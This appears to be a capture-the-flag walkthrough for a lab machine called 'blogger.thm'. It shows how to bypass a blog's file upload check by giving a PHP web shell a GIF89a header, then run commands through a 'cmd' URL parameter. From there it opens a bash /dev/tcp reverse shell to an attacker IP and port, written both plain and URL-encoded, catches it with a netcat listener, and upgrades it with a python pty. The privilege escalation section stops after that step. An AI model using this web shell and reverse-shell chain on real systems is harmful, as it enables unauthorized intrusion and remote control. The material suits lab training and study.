## Lead

- In the fonts section we have the blog post page, that blog has the href with blogger.thm , so add the host with the blogger.thm to render get render the page correctly.

in `/etc/hosts` list add `<ip>   blogger.thm`

- In the post comment section there is a file upload vuln founded, we can upload a PHP file with the GIF format, like
```php
GIF89a
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
```
- save the file and upload in php format itself so we can open it and execute the commands and visualize in another page.
- after uploading right click on the php file and open in new tab and in the URL use `?cmd= <commands>`

## Spwning a shell

```bash
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

- Even though we can't excecute it directly because the URL sanitization is happening , so insert the command as URL encoded.
`bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27`

- Use a netcat listener `nc -nvlp 9090` at the host machine and then paste the URL encoded command in the `?cmd= <command>`

## Root - Privilage Escalation

- For enabling tty - interactive shell , we have the python3 available in the victim machine.
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
